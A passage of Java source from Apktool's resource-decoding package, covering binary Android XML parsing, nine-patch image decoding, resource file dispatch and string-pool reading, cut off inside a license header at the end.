                m_styleAttribute = (m_classAttribute >>> 16) - 1;
                m_classAttribute = (m_classAttribute & 0xFFFF) - 1;
                m_attributes = m_reader.readIntArray(attributeCount * ATTRIBUTE_LENGTH);
                for (int i = ATTRIBUTE_IX_VALUE_TYPE; i < m_attributes.length; ) {
                    m_attributes[i] = (m_attributes[i] >>> 24);
                    i += ATTRIBUTE_LENGTH;
                }
                m_namespaces.increaseDepth();
                m_event = START_TAG;
                break;
            }

            if (chunkType == CHUNK_XML_END_TAG) {
                m_namespaceUri = m_reader.readInt();
                m_name = m_reader.readInt();
                m_event = END_TAG;
                m_decreaseDepth = true;
                break;
            }

            if (chunkType == CHUNK_XML_TEXT) {
                m_name = m_reader.readInt();
				/* ? */m_reader.skipInt();
				/* ? */m_reader.skipInt();
                m_event = TEXT;
                break;
            }
        }
    }

    private void setFirstError(AndrolibException error) {
        if (mFirstError == null) {
            mFirstError = error;
        }
    }

    // ///////////////////////////////// data
	/*
	 * All values are essentially indices, e.g. m_name is an index of name in
	 * m_strings.
	 */
    private ExtDataInput m_reader;
    private ResAttrDecoder mAttrDecoder;
    private AndrolibException mFirstError;

    private boolean m_operational = false;
    private StringBlock m_strings;
    private int[] m_resourceIDs;
    private final NamespaceStack m_namespaces = new NamespaceStack();
    private final String android_ns = "http://schemas.android.com/apk/res/android";
    private boolean m_decreaseDepth;
    private int m_event;
    private int m_lineNumber;
    private int m_name;
    private int m_namespaceUri;
    private int[] m_attributes;
    private int m_idAttribute;
    private int m_classAttribute;
    private int m_styleAttribute;

    private final static Logger LOGGER = Logger.getLogger(AXmlResourceParser.class.getName());
    private static final String E_NOT_SUPPORTED = "Method is not supported.";
    private static final int ATTRIBUTE_IX_NAMESPACE_URI = 0,
            ATTRIBUTE_IX_NAME = 1, ATTRIBUTE_IX_VALUE_STRING = 2,
            ATTRIBUTE_IX_VALUE_TYPE = 3, ATTRIBUTE_IX_VALUE_DATA = 4,
            ATTRIBUTE_LENGTH = 5;

    private static final int CHUNK_AXML_FILE = 0x00080003, CHUNK_AXML_FILE_BROKEN = 0x00080001,
            CHUNK_RESOURCEIDS = 0x00080180, CHUNK_XML_FIRST = 0x00100100,
            CHUNK_XML_START_NAMESPACE = 0x00100100,
            CHUNK_XML_END_NAMESPACE = 0x00100101,
            CHUNK_XML_START_TAG = 0x00100102, CHUNK_XML_END_TAG = 0x00100103,
            CHUNK_XML_TEXT = 0x00100104, CHUNK_XML_LAST = 0x00100104;

    private static final int PRIVATE_PKG_ID = 0x7F;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/AndroidManifestResourceParser.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import android.util.TypedValue;

import java.util.regex.Pattern;

/**
 * AXmlResourceParser specifically for parsing encoded AndroidManifest.xml.
 */
public class AndroidManifestResourceParser extends AXmlResourceParser {

    /**
     * Pattern for matching numeric string meta-data values. aapt automatically infers the
     * type for a manifest meta-data value based on the string in the unencoded XML. However,
     * some apps intentionally coerce integers to be strings by prepending an escaped space.
     * For details/discussion, see https://stackoverflow.com/questions/2154945/how-to-force-a-meta-data-value-to-type-string
     * With aapt1, the escaped space is dropped when encoded. For aapt2, the escaped space is preserved.
     */
    private static final Pattern PATTERN_NUMERIC_STRING = Pattern.compile("\\s?\\d+");

    @Override
    public String getAttributeValue(int index) {
        String value = super.getAttributeValue(index);

        if (!isNumericStringMetadataAttributeValue(index, value)) {
            return value;
        }

        // Patch the numeric string value by prefixing it with an escaped space.
        // Otherwise, when the decoded app is rebuilt, aapt will incorrectly encode
        // the value as an int or float (depending on aapt version), breaking the original
        // app functionality.
        return "\\ " + super.getAttributeValue(index).trim();
    }

    private boolean isNumericStringMetadataAttributeValue(int index, String value) {
        return "meta-data".equalsIgnoreCase(super.getName())
            && "value".equalsIgnoreCase(super.getAttributeName(index))
            && super.getAttributeValueType(index) == TypedValue.TYPE_STRING
            && PATTERN_NUMERIC_STRING.matcher(value).matches();
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/Res9patchStreamDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.AndrolibException;
import brut.androlib.err.CantFind9PatchChunkException;
import brut.util.ExtDataInput;
import org.apache.commons.io.IOUtils;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.awt.image.Raster;
import java.awt.image.WritableRaster;
import java.io.ByteArrayInputStream;
import java.io.DataInput;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class Res9patchStreamDecoder implements ResStreamDecoder {
    @Override
    public void decode(InputStream in, OutputStream out) throws AndrolibException {
        try {
            byte[] data = IOUtils.toByteArray(in);

            if (data.length == 0) {
                return;
            }

            BufferedImage im = ImageIO.read(new ByteArrayInputStream(data));
            int w = im.getWidth(), h = im.getHeight();

            BufferedImage im2 = new BufferedImage(w + 2, h + 2, BufferedImage.TYPE_INT_ARGB);
            if (im.getType() == BufferedImage.TYPE_CUSTOM) {
                //TODO: Ensure this is gray + alpha case?
                Raster srcRaster = im.getRaster();
                WritableRaster dstRaster = im2.getRaster();
                int[] gray = null, alpha = null;
                for (int y = 0; y < im.getHeight(); y++) {
                    gray = srcRaster.getSamples(0, y, w, 1, 0, gray);
                    alpha = srcRaster.getSamples(0, y, w, 1, 1, alpha);

                    dstRaster.setSamples(1, y + 1, w, 1, 0, gray);
                    dstRaster.setSamples(1, y + 1, w, 1, 1, gray);
                    dstRaster.setSamples(1, y + 1, w, 1, 2, gray);
                    dstRaster.setSamples(1, y + 1, w, 1, 3, alpha);
                }
            } else {
                im2.createGraphics().drawImage(im, 1, 1, w, h, null);
            }

            NinePatch np = getNinePatch(data);
            drawHLine(im2, h + 1, np.padLeft + 1, w - np.padRight);
            drawVLine(im2, w + 1, np.padTop + 1, h - np.padBottom);

            int[] xDivs = np.xDivs;
            if (xDivs.length == 0) {
                drawHLine(im2, 0, 1, w);
            } else {
                for (int i = 0; i < xDivs.length; i += 2) {
                    drawHLine(im2, 0, xDivs[i] + 1, xDivs[i + 1]);
                }
            }

            int[] yDivs = np.yDivs;
            if (yDivs.length == 0) {
                drawVLine(im2, 0, 1, h);
            } else {
                for (int i = 0; i < yDivs.length; i += 2) {
                    drawVLine(im2, 0, yDivs[i] + 1, yDivs[i + 1]);
                }
            }

            // Some images additionally use Optical Bounds
            // https://developer.android.com/about/versions/android-4.3.html#OpticalBounds
            try {
                OpticalInset oi = getOpticalInset(data);

                for (int i = 0; i < oi.layoutBoundsLeft; i++) {
                    int x = 1 + i;
                    im2.setRGB(x, h + 1, OI_COLOR);
                }

                for (int i = 0; i < oi.layoutBoundsRight; i++) {
                    int x = w - i;
                    im2.setRGB(x, h + 1, OI_COLOR);
                }

                for (int i = 0; i < oi.layoutBoundsTop; i++) {
                    int y = 1 + i;
                    im2.setRGB(w + 1, y, OI_COLOR);
                }

                for (int i = 0; i < oi.layoutBoundsBottom; i++) {
                    int y = h - i;
                    im2.setRGB(w + 1, y, OI_COLOR);
                }
            } catch (CantFind9PatchChunkException t) {
                // This chunk might not exist
            }

            ImageIO.write(im2, "png", out);
        } catch (IOException | NullPointerException ex) {
            // In my case this was triggered because a .png file was
            // containing a html document instead of an image.
            // This could be more verbose and try to MIME ?
            throw new AndrolibException(ex);
        }
    }

    private NinePatch getNinePatch(byte[] data) throws AndrolibException,
        IOException {
        ExtDataInput di = new ExtDataInput(new ByteArrayInputStream(data));
        find9patchChunk(di, NP_CHUNK_TYPE);
        return NinePatch.decode(di);
    }

    private OpticalInset getOpticalInset(byte[] data) throws AndrolibException,
        IOException {
        ExtDataInput di = new ExtDataInput(new ByteArrayInputStream(data));
        find9patchChunk(di, OI_CHUNK_TYPE);
        return OpticalInset.decode(di);
    }

    private void find9patchChunk(DataInput di, int magic) throws AndrolibException,
        IOException {
        di.skipBytes(8);
        while (true) {
            int size;
            try {
                size = di.readInt();
            } catch (IOException ex) {
                throw new CantFind9PatchChunkException("Cant find nine patch chunk", ex);
            }
            if (di.readInt() == magic) {
                return;
            }
            di.skipBytes(size + 4);
        }
    }

    private void drawHLine(BufferedImage im, int y, int x1, int x2) {
        for (int x = x1; x <= x2; x++) {
            im.setRGB(x, y, NP_COLOR);
        }
    }

    private void drawVLine(BufferedImage im, int x, int y1, int y2) {
        for (int y = y1; y <= y2; y++) {
            im.setRGB(x, y, NP_COLOR);
        }
    }

    private static final int NP_CHUNK_TYPE = 0x6e705463; // npTc
    private static final int OI_CHUNK_TYPE = 0x6e704c62; // npLb
    private static final int NP_COLOR = 0xff000000;
    private static final int OI_COLOR = 0xffff0000;

    private static class NinePatch {
        public final int padLeft, padRight, padTop, padBottom;
        public final int[] xDivs, yDivs;

        public NinePatch(int padLeft, int padRight, int padTop, int padBottom,
                         int[] xDivs, int[] yDivs) {
            this.padLeft = padLeft;
            this.padRight = padRight;
            this.padTop = padTop;
            this.padBottom = padBottom;
            this.xDivs = xDivs;
            this.yDivs = yDivs;
        }

        public static NinePatch decode(ExtDataInput di) throws IOException {
            di.skipBytes(1); // wasDeserialized
            byte numXDivs = di.readByte();
            byte numYDivs = di.readByte();
            di.skipBytes(1); // numColors
            di.skipBytes(8); // xDivs/yDivs offset
            int padLeft = di.readInt();
            int padRight = di.readInt();
            int padTop = di.readInt();
            int padBottom = di.readInt();
            di.skipBytes(4); // colorsOffset
            int[] xDivs = di.readIntArray(numXDivs);
            int[] yDivs = di.readIntArray(numYDivs);

            return new NinePatch(padLeft, padRight, padTop, padBottom, xDivs, yDivs);
        }
    }

    private static class OpticalInset {
        public final int layoutBoundsLeft, layoutBoundsTop, layoutBoundsRight, layoutBoundsBottom;

        public OpticalInset(int layoutBoundsLeft, int layoutBoundsTop,
                            int layoutBoundsRight, int layoutBoundsBottom) {
            this.layoutBoundsLeft = layoutBoundsLeft;
            this.layoutBoundsTop = layoutBoundsTop;
            this.layoutBoundsRight = layoutBoundsRight;
            this.layoutBoundsBottom = layoutBoundsBottom;
        }

        public static OpticalInset decode(ExtDataInput di) throws IOException {
            int layoutBoundsLeft = Integer.reverseBytes(di.readInt());
            int layoutBoundsTop = Integer.reverseBytes(di.readInt());
            int layoutBoundsRight = Integer.reverseBytes(di.readInt());
            int layoutBoundsBottom = Integer.reverseBytes(di.readInt());
            return new OpticalInset(layoutBoundsLeft, layoutBoundsTop,
                layoutBoundsRight, layoutBoundsBottom);
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/ResAttrDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.AndrolibException;
import brut.androlib.err.UndefinedResObjectException;
import brut.androlib.res.data.ResPackage;
import brut.androlib.res.data.ResResSpec;
import brut.androlib.res.data.value.ResAttr;
import brut.androlib.res.data.value.ResScalarValue;

public class ResAttrDecoder {
    public String decode(int type, int value, String rawValue, int attrResId)
            throws AndrolibException {
        ResScalarValue resValue = mCurrentPackage.getValueFactory().factory(
                type, value, rawValue);

        String decoded = null;
        if (attrResId > 0) {
            try {
                ResAttr attr = (ResAttr) getCurrentPackage().getResTable()
                        .getResSpec(attrResId).getDefaultResource().getValue();

                decoded = attr.convertToResXmlFormat(resValue);
            } catch (UndefinedResObjectException | ClassCastException ex) {
                // ignored
            }
        }

        return decoded != null ? decoded : resValue.encodeAsResXmlAttr();
    }

    public String decodeManifestAttr(int attrResId)
        throws AndrolibException {

        if (attrResId != 0) {
            ResResSpec resResSpec = getCurrentPackage().getResTable().getResSpec(attrResId);

            if (resResSpec != null) {
                return resResSpec.getName();
            }
        }

        return null;
    }

    public ResPackage getCurrentPackage() throws AndrolibException {
        if (mCurrentPackage == null) {
            throw new AndrolibException("Current package not set");
        }
        return mCurrentPackage;
    }

    public void setCurrentPackage(ResPackage currentPackage) {
        mCurrentPackage = currentPackage;
    }

    private ResPackage mCurrentPackage;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/ResFileDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.AndrolibException;
import brut.androlib.err.CantFind9PatchChunkException;
import brut.androlib.err.RawXmlEncounteredException;
import brut.androlib.res.data.ResResource;
import brut.androlib.res.data.value.ResBoolValue;
import brut.androlib.res.data.value.ResFileValue;
import brut.directory.DirUtil;
import brut.directory.Directory;
import brut.directory.DirectoryException;

import java.io.*;
import java.util.logging.Level;
import java.util.logging.Logger;

public class ResFileDecoder {
    private final ResStreamDecoderContainer mDecoders;

    public ResFileDecoder(ResStreamDecoderContainer decoders) {
        this.mDecoders = decoders;
    }

    public void decode(ResResource res, Directory inDir, Directory outDir)
            throws AndrolibException {

        ResFileValue fileValue = (ResFileValue) res.getValue();
        String inFileName = fileValue.getStrippedPath();
        String outResName = res.getFilePath();
        String typeName = res.getResSpec().getType().getName();

        String ext = null;
        String outFileName;
        int extPos = inFileName.lastIndexOf(".");
        if (extPos == -1) {
            outFileName = outResName;
        } else {
            ext = inFileName.substring(extPos).toLowerCase();
            outFileName = outResName + ext;
        }

        try {
            if (typeName.equals("raw")) {
                decode(inDir, inFileName, outDir, outFileName, "raw");
                return;
            }
            if (typeName.equals("font") && !".xml".equals(ext)) {
                decode(inDir, inFileName, outDir, outFileName, "raw");
                return;
            }
            if (typeName.equals("drawable") || typeName.equals("mipmap")) {
                if (inFileName.toLowerCase().endsWith(".9" + ext)) {
                    outFileName = outResName + ".9" + ext;

                    // check for htc .r.9.png
                    if (inFileName.toLowerCase().endsWith(".r.9" + ext)) {
                        outFileName = outResName + ".r.9" + ext;
                    }

                    // check for raw 9patch images
                    for (String extension : RAW_9PATCH_IMAGE_EXTENSIONS) {
                        if (inFileName.toLowerCase().endsWith("." + extension)) {
                            copyRaw(inDir, outDir, inFileName, outFileName);
                            return;
                        }
                    }

                    // check for xml 9 patches which are just xml files
                    if (inFileName.toLowerCase().endsWith(".xml")) {
                        decode(inDir, inFileName, outDir, outFileName, "xml");
                        return;
                    }

                    try {
                        decode(inDir, inFileName, outDir, outFileName, "9patch");
                        return;
                    } catch (CantFind9PatchChunkException ex) {
                        LOGGER.log(
                                Level.WARNING,
                                String.format(
                                        "Cant find 9patch chunk in file: \"%s\". Renaming it to *.png.",
                                        inFileName), ex);
                        outDir.removeFile(outFileName);
                        outFileName = outResName + ext;
                    }
                }

                // check for raw image
                for (String extension : RAW_IMAGE_EXTENSIONS) {
                    if (inFileName.toLowerCase().endsWith("." + extension)) {
                        copyRaw(inDir, outDir, inFileName, outFileName);
                        return;
                    }
                }

                if (!".xml".equals(ext)) {
                    decode(inDir, inFileName, outDir, outFileName, "raw");
                    return;
                }
            }

            decode(inDir, inFileName, outDir, outFileName, "xml");
        } catch (RawXmlEncounteredException ex) {
            // If we got an error to decode XML, lets assume the file is in raw format.
            // This is a large assumption, that might increase runtime, but will save us for situations where
            // XSD files are AXML`d on aapt1, but left in plaintext in aapt2.
            decode(inDir, inFileName, outDir, outFileName, "raw");
        } catch (AndrolibException ex) {
            LOGGER.log(Level.SEVERE, String.format(
                    "Could not decode file, replacing by FALSE value: %s",
                    inFileName), ex);
            res.replace(new ResBoolValue(false, 0, null));
        }
    }

    public void decode(Directory inDir, String inFileName, Directory outDir,
                       String outFileName, String decoder) throws AndrolibException {
        try (
                InputStream in = inDir.getFileInput(inFileName);
                OutputStream out = outDir.getFileOutput(outFileName)
        ) {
            mDecoders.decode(in, out, decoder);
        } catch (DirectoryException | IOException ex) {
            throw new AndrolibException(ex);
        }
    }

    public void copyRaw(Directory inDir, Directory outDir, String inFilename,
                        String outFilename) throws AndrolibException {
        try {
            DirUtil.copyToDir(inDir, outDir, inFilename, outFilename);
        } catch (DirectoryException ex) {
            throw new AndrolibException(ex);
        }
    }

    public void decodeManifest(Directory inDir, String inFileName,
                               Directory outDir, String outFileName) throws AndrolibException {
        try (
                InputStream in = inDir.getFileInput(inFileName);
                OutputStream out = outDir.getFileOutput(outFileName)
        ) {
            ((XmlPullStreamDecoder) mDecoders.getDecoder("xml")).decodeManifest(in, out);
        } catch (DirectoryException | IOException ex) {
            throw new AndrolibException(ex);
        }
    }

    private final static Logger LOGGER = Logger.getLogger(ResFileDecoder.class.getName());

    private final static String[] RAW_IMAGE_EXTENSIONS = new String[] {
        "m4a", // apple
        "qmg", // samsung
    };

    private final static String[] RAW_9PATCH_IMAGE_EXTENSIONS = new String[] {
        "qmg", // samsung
        "spi", // samsung
    };
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/ResRawStreamDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.AndrolibException;
import org.apache.commons.io.IOUtils;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

public class ResRawStreamDecoder implements ResStreamDecoder {
    @Override
    public void decode(InputStream in, OutputStream out)
            throws AndrolibException {
        try {
            IOUtils.copy(in, out);
        } catch (IOException ex) {
            throw new AndrolibException("Could not decode raw stream", ex);
        }
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/ResStreamDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.AndrolibException;
import java.io.InputStream;
import java.io.OutputStream;

public interface ResStreamDecoder {
    void decode(InputStream in, OutputStream out)
            throws AndrolibException;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/ResStreamDecoderContainer.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.AndrolibException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.HashMap;
import java.util.Map;

public class ResStreamDecoderContainer {
    private final Map<String, ResStreamDecoder> mDecoders = new HashMap<>();

    public void decode(InputStream in, OutputStream out, String decoderName)
            throws AndrolibException {
        getDecoder(decoderName).decode(in, out);
    }

    public ResStreamDecoder getDecoder(String name) throws AndrolibException {
        ResStreamDecoder decoder = mDecoders.get(name);
        if (decoder == null) {
            throw new AndrolibException("Undefined decoder: " + name);
        }
        return decoder;
    }

    public void setDecoder(String name, ResStreamDecoder decoder) {
        mDecoders.put(name, decoder);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/StringBlock.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import brut.androlib.res.xml.ResXmlEncoders;
import brut.util.ExtDataInput;
import com.google.common.annotations.VisibleForTesting;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.charset.*;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.logging.Logger;

public class StringBlock {

    /**
     * Reads whole (including chunk type) string block from stream. Stream must
     * be at the chunk type.
     * @param reader ExtDataInput
     * @return StringBlock
     *
     * @throws IOException Parsing resources.arsc error
     */
    public static StringBlock read(ExtDataInput reader) throws IOException {
        reader.skipCheckChunkTypeInt(CHUNK_STRINGPOOL_TYPE, CHUNK_NULL_TYPE);
        int chunkSize = reader.readInt();

        // ResStringPool_header
        int stringCount = reader.readInt();
        int styleCount = reader.readInt();
        int flags = reader.readInt();
        int stringsOffset = reader.readInt();
        int stylesOffset = reader.readInt();

        StringBlock block = new StringBlock();
        block.m_isUTF8 = (flags & UTF8_FLAG) != 0;
        block.m_stringOffsets = reader.readIntArray(stringCount);

        if (styleCount != 0) {
            block.m_styleOffsets = reader.readIntArray(styleCount);
        }

        int size = ((stylesOffset == 0) ? chunkSize : stylesOffset) - stringsOffset;
        block.m_strings = new byte[size];
        reader.readFully(block.m_strings);

        if (stylesOffset != 0) {
            size = (chunkSize - stylesOffset);
            block.m_styles = reader.readIntArray(size / 4);

            // read remaining bytes
            int remaining = size % 4;
            if (remaining >= 1) {
                while (remaining-- > 0) {
                    reader.readByte();
                }
            }
        }

        return block;
    }

    /**
     * Returns raw string (without any styling information) at specified index.
     * @param index int
     * @return String
     */
    public String getString(int index) {
        if (index < 0 || m_stringOffsets == null || index >= m_stringOffsets.length) {
            return null;
        }
        int offset = m_stringOffsets[index];
        int length;

        int[] val;
        if (m_isUTF8) {
            val = getUtf8(m_strings, offset);
            offset = val[0];
        } else {
            val = getUtf16(m_strings, offset);
            offset += val[0];
        }
        length = val[1];
        return decodeString(offset, length);
    }

    /**
     * @param index Location (index) of string to process to HTML
     * @return String Returns string with style tags (html-like).
     */
    public String getHTML(int index) {
        String text = getString(index);
        if (text == null) {
            return null;
        }
        int[] style = getStyle(index);
        if (style == null) {
            return ResXmlEncoders.escapeXmlChars(text);
        }

        // If the returned style is further in string, than string length. Lets skip it.
        if (style[1] > text.length()) {
            return ResXmlEncoders.escapeXmlChars(text);
        }

        // Convert styles to spans
        List<StyledString.Span> spans = new ArrayList<>(style.length / 3);
        for (int i = 0; i < style.length; i += 3) {
            spans.add(new StyledString.Span(getString(style[i]), style[i + 1], style[i + 2]));
        }
        Collections.sort(spans);

        StyledString styledString = new StyledString(text, spans);
        return styledString.toString();
    }

    /**
     * Finds index of the string. Returns -1 if the string was not found.
     *
     * @param string String to index location of
     * @return int (Returns -1 if not found)
     */
    public int find(String string) {
        if (string == null) {
            return -1;
        }
        for (int i = 0; i != m_stringOffsets.length; ++i) {
            int offset = m_stringOffsets[i];
            int length = getShort(m_strings, offset);
            if (length != string.length()) {
                continue;
            }
            int j = 0;
            for (; j != length; ++j) {
                offset += 2;
                if (string.charAt(j) != getShort(m_strings, offset)) {
                    break;
                }
            }
            if (j == length) {
                return i;
            }
        }
        return -1;
    }

    private StringBlock() {
    }

    @VisibleForTesting
    StringBlock(byte[] strings, boolean isUTF8) {
        m_strings = strings;
        m_isUTF8 = isUTF8;
    }

    /**
     * Returns style information - array of int triplets, where in each triplet:
     * * first int is index of tag name ('b','i', etc.) * second int is tag
     * start index in string * third int is tag end index in string
     */
    private int[] getStyle(int index) {
        if (m_styleOffsets == null || m_styles == null|| index >= m_styleOffsets.length) {
            return null;
        }
        int offset = m_styleOffsets[index] / 4;
        int count = 0;
        int[] style;

        for (int i = offset; i < m_styles.length; ++i) {
            if (m_styles[i] == -1) {
                break;
            }
            count += 1;
        }

        if (count == 0 || (count % 3) != 0) {
            return null;
        }
        style = new int[count];

        for (int i = offset, j = 0; i < m_styles.length;) {
            if (m_styles[i] == -1) {
                break;
            }
            style[j++] = m_styles[i++];
        }
        return style;
    }

    @VisibleForTesting
    String decodeString(int offset, int length) {
        try {
            final ByteBuffer wrappedBuffer = ByteBuffer.wrap(m_strings, offset, length);
            return (m_isUTF8 ? UTF8_DECODER : UTF16LE_DECODER).decode(wrappedBuffer).toString();
        } catch (CharacterCodingException ex) {
            if (!m_isUTF8) {
                LOGGER.warning("Failed to decode a string at offset " + offset + " of length " + length);
                return null;
            }
        }

        try {
            final ByteBuffer wrappedBufferRetry = ByteBuffer.wrap(m_strings, offset, length);
            // in some places, Android uses 3-byte UTF-8 sequences instead of 4-bytes.
            // If decoding failed, we try to use CESU-8 decoder, which is closer to what Android actually uses.
            return CESU8_DECODER.decode(wrappedBufferRetry).toString();
        } catch (CharacterCodingException e) {
            LOGGER.warning("Failed to decode a string with CESU-8 decoder.");
            return null;
        }
    }

    private static int getShort(byte[] array, int offset) {
        return (array[offset + 1] & 0xff) << 8 | array[offset] & 0xff;
    }

    private static int[] getUtf8(byte[] array, int offset) {
        int val = array[offset];
        int length;
        // We skip the utf16 length of the string
        if ((val & 0x80) != 0) {
            offset += 2;
        } else {
            offset += 1;
        }
        // And we read only the utf-8 encoded length of the string
        val = array[offset];
        offset += 1;
        if ((val & 0x80) != 0) {
        	int low = (array[offset] & 0xFF);
        	length = ((val & 0x7F) << 8) + low;
            offset += 1;
        } else {
            length = val;
        }
        return new int[] { offset, length};
    }

    private static int[] getUtf16(byte[] array, int offset) {
        int val = ((array[offset + 1] & 0xFF) << 8 | array[offset] & 0xFF);

        if ((val & 0x8000) != 0) {
            int high = (array[offset + 3] & 0xFF) << 8;
            int low = (array[offset + 2] & 0xFF);
            int len_value =  ((val & 0x7FFF) << 16) + (high + low);
            return new int[] {4, len_value * 2};

        }
        return new int[] {2, val * 2};
    }

    private int[] m_stringOffsets;
    private byte[] m_strings;
    private int[] m_styleOffsets;
    private int[] m_styles;
    private boolean m_isUTF8;

    private final CharsetDecoder UTF16LE_DECODER = StandardCharsets.UTF_16LE.newDecoder();
    private final CharsetDecoder UTF8_DECODER = StandardCharsets.UTF_8.newDecoder();
    private final CharsetDecoder CESU8_DECODER = Charset.forName("CESU8").newDecoder();
    private static final Logger LOGGER = Logger.getLogger(StringBlock.class.getName());

    // ResChunk_header = header.type (0x0001) + header.headerSize (0x001C)
    private static final int CHUNK_STRINGPOOL_TYPE = 0x001C0001;
    private static final int CHUNK_NULL_TYPE = 0x00000000;
    private static final int UTF8_FLAG = 0x00000100;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/StyledString.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
